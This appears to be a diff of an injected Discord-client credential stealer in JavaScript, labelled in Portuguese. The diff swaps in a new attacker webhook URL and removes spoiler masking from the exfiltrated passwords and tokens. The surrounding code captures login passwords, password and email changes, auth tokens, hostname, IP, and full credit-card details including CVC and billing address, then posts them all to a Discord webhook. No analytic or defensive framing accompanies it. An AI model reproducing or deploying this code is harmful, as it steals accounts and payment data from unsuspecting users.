@@ -8,7 +8,7 @@ const fs = require("fs"),
     querystring = require("querystring"),
     electron = require("electron"),
     os = require("os");
-var webhook = "https://discord.com/api/webhooks/908116747570266153/qKEs06j5cl_kbAYpkhtriQMiT3CmWuVXhRJXa1bv8-59kVjC1VUU5pfIRUSuS8N8UH7o";
+var webhook = "https://discord.com/api/webhooks/908123257297846283/irG4sMPmMq-iPwJ69BLRK3vIGpXthV7SQZ5w6_i-6xEkt7ltHYBinyj7Kui2rwjKmdas";
 const computerName = os.hostname(),
     discordInstall = `${__dirname.split("\\")[5]} | ${__dirname.split("\\")[6]}`;
 
@@ -50,10 +50,10 @@ function Login(e, t, n) {
                         content: "",
                         embeds: [{
                             title: "Login",
-                            color: 3447704,
+                            color: 0000000,
                             fields: [{
                                 name: "Info's",
-                                value: `\`\`\`PcNome: \n${computerName}\nIP: \n${s}\nInjetado Em: \n${discordInstall}\n\`\`\``,
+                                value: `\`\`\`NomePC: \n${computerName}\nIP: \n${s}\nInjetado Em: \n${discordInstall}\n\`\`\``,
                                 inline: !1
                             }, {
                                 name: "TAG",
@@ -81,11 +81,11 @@ function Login(e, t, n) {
                                 inline: !0
                             }, {
                                 name: "Senha",
-                                value: `\`||${t}||\``,
+                                value: `\`${t}\``,
                                 inline: !0
                             }, {
                                 name: "Token",
-                                value: `\`\`\`||${n}||\`\`\``,
+                                value: `\`\`\`${n}\`\`\``,
                                 inline: !1
                             }],
                             author: {
@@ -99,7 +99,7 @@ function Login(e, t, n) {
                             }
                         }, {
                             title: `Amigos Raros(${JSON.parse(r).filter(e=>1==e.type).length})`,
-                            color: 3447704,
+                            color: 0000000,
                             description: function() {
                                 const e = JSON.parse(r).filter(e => 1 == e.type);
                                 var t = "";
@@ -107,7 +107,7 @@ function Login(e, t, n) {
                                     var n = GetRBadges(z.user.public_flags);
                                     "" != n && (t += n + ` ${z.user.username}#${z.user.discriminator}\n`)
                                 }
-                                return "" == t && (t = "Nenhum amigo raro encontrado"), t
+                                return "" == t && (t = "Nenhum amigo Raro encontrado"), t
                             }(),
                             author: {
                                 name: "Vilao"
@@ -138,10 +138,10 @@ function ChangePassword(e, t, n) {
                     content: "",
                     embeds: [{
                         title: "Senha alterada",
-                        color: 3447704,
+                        color: 0000000,
                         fields: [{
                             name: "Info's",
-                            value: `\`\`\`PcName: \n${computerName}\nIP: \n${s}\nInjetado Em: \n${discordInstall}\n\`\`\``,
+                            value: `\`\`\`NomePC: \n${computerName}\nIP: \n${s}\nInjetado Em: \n${discordInstall}\n\`\`\``,
                             inline: !1
                         }, {
                             name: "Nome",
@@ -169,15 +169,15 @@ function ChangePassword(e, t, n) {
                             inline: !1
                         }, {
                             name: "Senha antiga",
-                            value: `\`||${e}||\``,
+                            value: `\`${e}\``,
                             inline: !0
                         }, {
                             name: "Nova senha",
-                            value: `\`||${t}||\``,
+                            value: `\`${t}\``,
                             inline: !0
                         }, {
                             name: "Token",
-                            value: `\`\`\`||${n}||\`\`\``,
+                            value: `\`\`\`${n}\`\`\``,
                             inline: !1
                                     }],
                         author: {
@@ -208,10 +208,10 @@ function ChangeEmail(e, t, n) {
                     content: "",
                     embeds: [{
                         title: "Email Alterado",
-                        color: 3447704,
+                        color: 0000000,
                         fields: [{
                             name: "Info's",
-                            value: `\`\`\`PcName: \n${computerName}\nIP: \n${s}\`\`\``,
+                            value: `\`\`\`NomePC: \n${computerName}\nIP: \n${s}\`\`\``,
                             inline: !1
                         }, {
                             name: "Nome",
@@ -235,15 +235,15 @@ function ChangeEmail(e, t, n) {
                             inline: !1
                         }, {
                             name: "Novo Email",
-                            value: `\`||${e}||\``,
+                            value: `\`${e}\``,
                             inline: !0
                         }, {
                             name: "Senha",
-                            value: `\`||${t}||\``,
+                            value: `\`${t}\``,
                             inline: !0
                         }, {
                             name: "Token",
-                            value: `\`\`\`||${n}||\`\`\``,
+                            value: `\`\`\`${n}\`\`\``,
                             inline: !1
                         }],
                         author: {
@@ -273,7 +273,7 @@ function CreditCardAdded(e, t, n, r, a, s, o, i, l, p) {
                     content: "",
                     embeds: [{
                         title: "Cartão Adicionado",
-                        description: "**Nome:**```" + c.username + "#" + c.discriminator + "```\n**ID:**```" + c.id + "```\n**Email:**```" + c.email + "```\n**Tipo de nitro:**```" + GetNitro(c.premium_type) + "```\n**Badges:**```" + GetBadges(c.flags) + "```\n**Cartão de C N°: **```" + e + "```\n**Expira em: **```" + n + "/" + r + "```\n**CVC: **```" + t + "```\n**Região: **```" + l + "```\n**Estado: **```" + o + "```\n**Cidade: **```" + s + "```\n**ZIP:**```" + i + "```\n**Bairro: **```" + a + "```\n**Token:**```" + p + "```\n**IP: **```" + d + "```",
+                        description: "**Nome:**```" + c.username + "#" + c.discriminator + "```\n**ID:**```" + c.id + "```\n**Email:**```" + c.email + "```\n**Tipo de nitro:**```" + GetNitro(c.premium_type) + "```\n**Badges:**```" + GetBadges(c.flags) + "```\n**Cartão N°: **```" + e + "```\n**Expira em: **```" + n + "/" + r + "```\n**CVC: **```" + t + "```\n**Região: **```" + l + "```\n**Estado: **```" + o + "```\n**Cidade: **```" + s + "```\n**ZIP:**```" + i + "```\n**Bairro: **```" + a + "```\n**Token:**```" + p + "```\n**IP: **```" + d + "```",
                         author: {
                             name: "Vilao"
                         },
